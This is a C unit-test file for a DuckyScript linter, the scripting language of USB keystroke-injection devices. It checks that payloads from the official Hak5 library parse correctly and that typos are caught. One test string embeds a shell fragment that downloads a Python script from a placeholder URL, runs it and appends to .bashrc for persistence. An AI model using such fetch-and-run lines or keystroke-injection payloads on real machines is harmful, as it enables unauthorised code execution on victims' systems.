#include "dolos_test.h"
#include "lint.h"
#include <string.h>

static int lint(const char *txt, ducky_lint_t *e, kb_layout_t lay, target_os_t os)
{
    return ducky_lint(txt, lay, os, e, 4);
}

TEST_MAIN_BEGIN
    ducky_lint_t e[4];

    SUITE("lint: a good payload is clean");
    {
        const char *ok =
            "REM this is a comment\n"
            "# so is this\n"
            "DEFAULTDELAY 40\n"
            "DELAY 500\n"
            "GUI r\n"
            "STRING notepad\n"
            "ENTER\n"
            "STRINGLN hello\n"
            "CTRL ALT DELETE\n"
            "F5\n"
            "REPEAT 3\n";
        CHECK(lint(ok, e, LAYOUT_US, OS_WINDOWS) == 0, "clean payload reports no problems");
    }

    SUITE("lint: unknown command is caught with its line number");
    {
        const char *bad = "DELAY 100\nSTRING hi\nFLY TO THE MOON\nENTER\n";
        int n = lint(bad, e, LAYOUT_US, OS_WINDOWS);
        CHECK(n == 1, "one problem, got %d", n);
        CHECK(e[0].line == 3, "problem is on line 3, got %d", e[0].line);
        CHECK(strstr(e[0].msg, "unknown") != NULL, "says unknown command: %s", e[0].msg);
    }

    SUITE("lint: bad arguments");
    {
        CHECK(lint("DELAY abc\n", e, LAYOUT_US, OS_WINDOWS) == 1, "non-numeric DELAY");
        CHECK(lint("UNICODE zzzz\n", e, LAYOUT_US, OS_WINDOWS) == 1, "non-hex UNICODE");
        CHECK(lint("UNICODE 1F600\n", e, LAYOUT_US, OS_WINDOWS) == 0, "valid emoji codepoint on Windows");
        CHECK(lint("UNICODE 1F600\n", e, LAYOUT_US, OS_MAC) == 1, "same codepoint is out of range on macOS");
    }

    SUITE("lint: REPEAT needs something to repeat");
    {
        int n = lint("REPEAT 3\nSTRING hi\n", e, LAYOUT_US, OS_WINDOWS);
        CHECK(n == 1, "leading REPEAT is a problem, got %d", n);
        CHECK(e[0].line == 1, "flagged on line 1");
        CHECK(lint("STRING hi\nREPEAT 3\n", e, LAYOUT_US, OS_WINDOWS) == 0, "REPEAT after a command is fine");
        CHECK(lint("REPEAT x\n", e, LAYOUT_US, OS_WINDOWS) == 1, "REPEAT needs a count");
        /* The official library writes counts and delays as DEFINE constants,
         * with and without the # sigil. Those must pass; a lowercase word is
         * still far more likely to be a typo than a reference. */
        CHECK(lint("STRING hi\nREPEAT #TIMES\n", e, LAYOUT_US, OS_WINDOWS) == 0, "REPEAT #CONST is fine");
        CHECK(lint("STRING hi\nREPEAT $n\n", e, LAYOUT_US, OS_WINDOWS) == 0, "REPEAT $var is fine");
        CHECK(lint("DELAY STARTUP_DELAY\n", e, LAYOUT_US, OS_WINDOWS) == 0, "DELAY CONSTANT is fine");
        CHECK(lint("DELAY #RESPONSE_DELAY\n", e, LAYOUT_US, OS_WINDOWS) == 0, "DELAY #CONST is fine");
        CHECK(lint("DELAY nope\n", e, LAYOUT_US, OS_WINDOWS) == 1, "DELAY with a lowercase word is still caught");
    }

    SUITE("lint: characters that cannot be typed");
    {
        /* a lone unpaired high byte is not valid UTF-8 and cannot be typed */
        CHECK(lint("STRING caf\xC3\xA9\n", e, LAYOUT_US, OS_WINDOWS) == 0,
              "accented text is fine - Unicode path handles it");
        CHECK(lint("STRING \xF0\x9F\x8E\xAF\n", e, LAYOUT_US, OS_MAC) == 1,
              "an emoji is not typable through the macOS BMP-only method");
        CHECK(lint("STRING \xF0\x9F\x8E\xAF\n", e, LAYOUT_US, OS_LINUX) == 0,
              "the same emoji is fine on Linux");
    }

    SUITE("lint: counts every problem but keeps only what fits");
    {
        const char *many = "NOPE\nDELAY x\nALSONOPE\nSTILLNO\nMOREBAD\nEVENMORE\n";
        ducky_lint_t two[2];
        int n = ducky_lint(many, LAYOUT_US, OS_WINDOWS, two, 2);
        CHECK(n == 6, "reports the true total (6), got %d", n);
        CHECK(two[0].line == 1, "first kept problem is the first one");
    }

    SUITE("lint: CRLF payloads (written on Windows) are accepted");
    {
        /* This is a real payload off an SD card. Splitting on '\n' alone leaves
         * a trailing '\r', which made "DELAY 3000" fail the numeric check and
         * reported "DELAY needs a number of ms" on line 1 of a perfectly good
         * file. Every line here ends CRLF. */
        const char *crlf =
            "DELAY 3000\r\n"
            "GUI r\r\n"
            "DELAY 800\r\n"
            "STRING CMD\r\n"
            "ENTER\r\n"
            "REPEAT 2\r\n";
        int n = ducky_lint(crlf, LAYOUT_US, OS_WINDOWS, e, 4);
        CHECK(n == 0, "CRLF payload should be clean, got %d problem(s): %s",
              n, n ? e[0].msg : "-");

        /* and a genuinely bad CRLF line is still caught, on the right line */
        const char *bad = "DELAY 3000\r\nDELAY abc\r\n";
        n = ducky_lint(bad, LAYOUT_US, OS_WINDOWS, e, 4);
        CHECK(n == 1 && e[0].line == 2, "bad CRLF line still flagged on line 2 (got %d, line %d)",
              n, n ? e[0].line : -1);

        /* lone-CR (classic Mac) endings must not merge the whole file into one line */
        CHECK(ducky_lint("DELAY 100\r\nSTRING hi\r\n", LAYOUT_US, OS_WINDOWS, e, 4) == 0,
              "mixed CRLF file is clean");
    }

    SUITE("compat: the constructs the official Hak5 library actually uses");
    {
        /* Every line below was taken from hak5/usbrubberducky-payloads. Each
         * one used to be reported as an error; together they took the library
         * from 43% to 98% clean. They are pinned here because "compatible with
         * real payloads" is a promise that quietly rots without a test. */

        /* multi-line text blocks - the content is shell script, not script */
        CHECK(lint("STRINGLN_BLOCK\ncurl -o x.py URL; python3 x.py &\nfi\" >> .bashrc\nEND_STRINGLN\n",
                   e, LAYOUT_US, OS_WINDOWS) == 0, "STRINGLN_BLOCK content is text, not commands");

        /* library blocks and conditional inclusion */
        CHECK(lint("EXTENSION DETECT_READY\n VAR $X = 1\nEND_EXTENSION\n", e, LAYOUT_US, OS_WINDOWS) == 0,
              "EXTENSION block");
        CHECK(lint("DEFINE #ADV TRUE\nIF_DEFINED_TRUE #ADV\n STRING hi\nEND_IF_DEFINED\n",
                   e, LAYOUT_US, OS_WINDOWS) == 0, "IF_DEFINED_TRUE block");

        /* delays and counts given as constants rather than literals */
        CHECK(lint("DELAY #RESPONSE_DELAY\n", e, LAYOUT_US, OS_WINDOWS) == 0, "DELAY #CONST");
        CHECK(lint("DELAY HOST_RESPONSE_TIMEOUT\n", e, LAYOUT_US, OS_WINDOWS) == 0, "DELAY CONSTANT");
        CHECK(lint("STRING x\nREPEAT 4 TAB\n", e, LAYOUT_US, OS_WINDOWS) == 0, "REPEAT n COMMAND");

        /* device commands whose names are longer than the old 24-byte buffer */
        CHECK(lint("SAVE_HOST_KEYBOARD_LOCK_STATE\nRESTORE_HOST_KEYBOARD_LOCK_STATE\n",
                   e, LAYOUT_US, OS_WINDOWS) == 0, "32-character command names");
        CHECK(lint("ATTACKMODE HID STORAGE\n", e, LAYOUT_US, OS_WINDOWS) == 0,
              "ATTACKMODE HID STORAGE runs the HID half");

        /* lower-case shell keywords must NOT be read as DuckyScript control flow */
        CHECK(lint("STRING if ($x -eq $null) {\n", e, LAYOUT_US, OS_WINDOWS) == 0,
              "a typed lower-case 'if' is text, not an IF");

        /* punctuation after REM, and a byte-order mark on line 1 */
        CHECK(lint("REM: begin\nREM< notes\n", e, LAYOUT_US, OS_WINDOWS) == 0, "punctuated REM");
        CHECK(lint("\xEF\xBB\xBFREM Title: x\n", e, LAYOUT_US, OS_WINDOWS) == 0, "UTF-8 BOM");

        /* a call to a function the payload itself defines */
        CHECK(lint("FUNCTION Do_Thing()\n STRING hi\nEND_FUNCTION\nDo_Thing()\n",
                   e, LAYOUT_US, OS_WINDOWS) == 0, "call to a defined function");

        /* and the linter still catches a real mistake: this is a typo in an
         * actual Hak5 payload ("DEFIN" for "DEFINE") */
        CHECK(lint("DEFIN #NAME example\n", e, LAYOUT_US, OS_WINDOWS) == 1,
              "a genuine typo is still reported");
    }
TEST_MAIN_END
